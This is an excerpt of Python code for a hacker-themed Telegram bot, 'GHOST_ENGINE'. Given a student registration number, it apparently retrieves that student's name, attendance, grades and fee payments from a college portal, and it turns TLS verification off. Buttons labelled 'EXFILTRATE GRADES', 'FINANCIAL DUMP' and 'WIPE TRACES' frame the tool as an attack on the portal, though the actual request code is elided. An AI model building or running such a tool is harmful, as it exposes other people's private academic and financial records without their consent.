...
def run_heartbeat():
    ...
    class HealthCheckHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            ...
            self.end_headers()
            self.wfile.write(b"GHOST_ENGINE_V16_EXPLOIT_ACTIVE")
...
client = httpx.AsyncClient(timeout=40.0, verify=False, headers=HEADERS)
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    banner = (
        ...
        "      \  /   \  /   \  /  \n"
        "       \/     \/     \/   \n"
        " [ G H O S T _ E N G I N E ]\n"
        "----------------------------\n"
        "```\n"
        "💀 **AWAITING TARGET ID:**\n"
        "_Send Registration Number to intercept data..._"
    )
...
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # OSINT Boot Sequence
    log = await update.message.reply_text("`[>] INJECTING OVERFLOW...`", parse_mode=ParseMode.MARKDOWN)
    await asyncio.sleep(0.4)
    await log.edit_text("`[>] BYPASSING PORTAL GATEWAY...`", parse_mode=ParseMode.MARKDOWN)
    ...
    try:
        ...
        intel = (
            ...
            f"👤 **TARGET:** `{name}`\n"
            f"🆔 **UID:** `{reg}`\n"
            f"📡 **STATUS:** `NODE_COMPROMISED`"
        )
        
        kb = [
            [InlineKeyboardButton("📊 ATTENDANCE LOGS", callback_data="att")],
            [InlineKeyboardButton("🏆 EXFILTRATE GRADES", callback_data="res")],
            [InlineKeyboardButton("💰 FINANCIAL DUMP", callback_data="fee")],
            [InlineKeyboardButton("🧹 WIPE TRACES", callback_data="clear")]
        ]
        
        await update.message.reply_text(intel, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    except:
        await log.edit_text("❌ `CONNECTION REJECTED BY HOST`")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    reg = context.user_data.get("reg")
    if not reg: return await query.answer("SESSION TIMEOUT")
    
    await query.answer("DECRYPTING DATA PACKETS...")
    encoded_id = b64_encode(reg)
    ...
    if query.data == "res":
        ...
        verdict = "🔴 [ SYSTEM: COMPROMISED ]" if backlogs > 0 else "🟢 [ SYSTEM: SECURE ]"

        res_msg = (
            f"🏆 **EXFILTRATION COMPLETE**\n"
            f"📈 **SGPA:** `{sgpa}` | ⚠️ **BL:** `{backlogs}`\n"
            f"{verdict}\n\n"
            f"{transcript if found else '`[!] NO DATA FOUND`'}"
        )
        ...
        alert = "🚨 CRITICAL_LOW" if float(perc) < 75 else "🛡️ MAINTAINED"
        ...
        for y in ["I-BTECH", "II-BTECH", "III-BTECH", "IV-BTECH"]:
            ...
            if h:
                ...
                report += f"📅 **{y}**: `P: ₹{p.group(1) if p else '0'}` | `B: ₹{b.group(1) if b else '0'}`\n"
                found_fee = True
        await query.message.reply_text(report if found_fee else "❌ `NO FINANCIAL DATA`", parse_mode=ParseMode.MARKDOWN)

    elif query.data == "clear":
        await query.message.edit_text("`[!] Logs Wiped. Session Purged.`", parse_mode=ParseMode.MARKDOWN)
